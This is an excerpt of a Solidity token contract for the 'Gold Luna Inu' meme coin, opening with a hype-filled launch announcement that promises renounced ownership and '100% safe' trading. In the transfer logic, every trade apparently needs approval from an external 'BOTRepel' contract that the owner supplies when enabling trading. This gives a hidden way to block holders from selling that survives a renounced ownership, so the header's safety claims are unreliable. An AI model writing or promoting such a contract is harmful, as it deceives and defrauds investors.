...
/*
   Gold Luna Inu The New Decentralised Luna Token
    
   Time: 22:00 PM Friday, May 20, 2022, UTC.
   #LUNA is dead, and millions of investors lost their life savings, 
   will you wait for the #LUNA team's to execute their poorly designed 
   plan or will you join the new decentralised and fully community owned 
   #LUNA and reach a moon made of gold?

   $GLINU will list on Uniswap #ETH on Friday, May 20, 2022, 22:00 UTC.

   I create $GLINU to hand it over to the community.
   Join the community and help grow it yourself if you are interested.

   Great features:
   2% fee goes to the treasury wallet, community will decide how 
   treasury funds will be used
   1% of total supply limit on each transaction
   2% of total supply limit for each wallet
   While being a low tax token, GLINU is protected from MEV “sandwich” bots
   by an innovative code that prevents said bots to trade slowly draining liquidity.
   

   I will lock liquidity LPs tokens with Team.finance for 3 months, to be extended for 2 years at 1 mlm market cap.
   I will renounce the ownership to burn addresses to transfer $GLINU to the community and ensure it's 100% safe.

   I will add 2 ETH and 98% of the total supply to the pool
   Let’s take $GLINU to the moon !

   1,000,000,000 total supply
   10,000,000 tokens limitation for each trade, which is 1% of the total supply 
   20,000,000 tokens limitation for each wallet, which is 2% of the total supply
   2% tokens for dev

   https://t.me/GoldlLunaInu
   http://twitter.com/GoldlLunaInu
*/
...
interface BOTRepel {
    function isBOT(address from, address to) external returns(bool);
    function setPairAddress(address _pairAddress) external;
}

contract GoldLunaInu is ERC20, Ownable {
    ...
    address public marketingWallet = 0xEe868cCeAEdA5708F6860948405Bb7108a639A29;
    ...
    constructor() ERC20("Gold Luna Inu", "GLINU") {
    ...
    function enableTrading(address _botrepel) external onlyOwner {
        require(!tradingActive, "Cannot re-enable trading");
        botrepel = BOTRepel(_botrepel);
        botrepel.setPairAddress(uniswapV2Pair);
        tradingActive = true;
        swapEnabled = true;
    ...
    function _transfer(
      ...
      if(limitsInEffect){
        ...
        if (tradingActive) {
           bool notbot;
           try botrepel.isBOT(from,to) returns (bool bot) {
              notbot = bot;
           } catch { revert(); }
          require(notbot, "MEV Bot Detected");
        }
